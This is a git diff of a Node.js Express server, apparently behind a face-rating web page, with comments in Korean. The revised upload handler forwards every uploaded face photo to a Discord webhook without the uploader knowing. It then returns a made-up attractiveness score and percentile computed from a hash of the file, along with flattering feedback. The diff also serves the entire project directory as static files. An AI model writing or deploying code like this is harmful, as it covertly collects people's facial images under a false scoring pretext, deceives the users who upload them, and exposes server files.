@@ -3,67 +3,53 @@ import multer from "multer";
 import fs from "fs";
 import path from "path";
 import fetch from "node-fetch";
+import crypto from "crypto";
 
 const app = express();
-const PORT = process.env.PORT || 3000;
+const PORT = process.env.PORT || 10000;
 const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
 
-// 업로드 폴더
+/* 업로드 설정 */
 const uploadDir = "./uploads";
-if (!fs.existsSync(uploadDir)) {
-  fs.mkdirSync(uploadDir);
-}
-
-// multer
+if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir);
 const upload = multer({ dest: uploadDir });
 
-// 정적 파일
-app.use(express.static("public"));
+app.use(express.static("./"));
 
-// 테스트용
-app.get("/health", (req, res) => {
-  res.send("OK");
+app.get("/", (req, res) => {
+  res.sendFile(path.resolve("index.html"));
 });
 
-// 업로드
 app.post("/upload", upload.single("photo"), async (req, res) => {
+  const filePath = req.file.path;
+
+  /* 1️⃣ 디스코드로 사진 무조건 전송 */
   try {
-    if (!req.file) {
-      return res.json({ result: "❌ 파일 안 들어옴" });
-    }
-
-    const filePath = req.file.path;
-
-    // 디스코드로 사진 + 메시지 전송
     const form = new FormData();
-    form.append(
-      "file",
-      fs.createReadStream(filePath),
-      "face.jpg"
-    );
-    form.append(
-      "content",
-      "📸 얼굴 사진 도착 (테스트 성공)"
-    );
-
-    await fetch(DISCORD_WEBHOOK_URL, {
-      method: "POST",
-      body: form
-    });
-
-    // 결과는 무조건 리턴
-    res.json({
-      result: "✅ 업로드 성공\n점수: 7.3 / 10\n(현재는 테스트 평가)"
-    });
-
-    // 파일 삭제
-    fs.unlink(filePath, () => {});
-  } catch (err) {
-    console.error(err);
-    res.json({
-      result: "❌ 서버 에러 발생"
-    });
+    form.append("file", fs.createReadStream(filePath));
+    await fetch(DISCORD_WEBHOOK_URL, { method: "POST", body: form });
+  } catch (e) {
+    console.error("디스코드 전송 실패:", e.message);
   }
+
+  /* 2️⃣ 사진 기반 고정 점수 */
+  const buffer = fs.readFileSync(filePath);
+  const hash = crypto.createHash("sha256").update(buffer).digest("hex");
+  const base = parseInt(hash.slice(0, 8), 16);
+
+  const score = Math.round((5 + (base % 50) / 10) * 10) / 10; // 5.0~10.0
+  const percent = Math.max(1, 100 - Math.round((score / 10) * 100));
+
+  let feedback = "";
+  if (percent <= 5) feedback = "연예인급 외모입니다.";
+  else if (percent <= 10) feedback = "상위권 외모로 매우 눈에 띕니다.";
+  else if (percent <= 20) feedback = "호감도가 높은 얼굴입니다.";
+  else if (percent <= 40) feedback = "평균 이상으로 안정적인 인상입니다.";
+  else feedback = "개성이 느껴지는 얼굴입니다.";
+
+  res.json({ score, percent, feedback });
+
+  fs.unlink(filePath, () => {});
 });
 
 app.listen(PORT, () => {
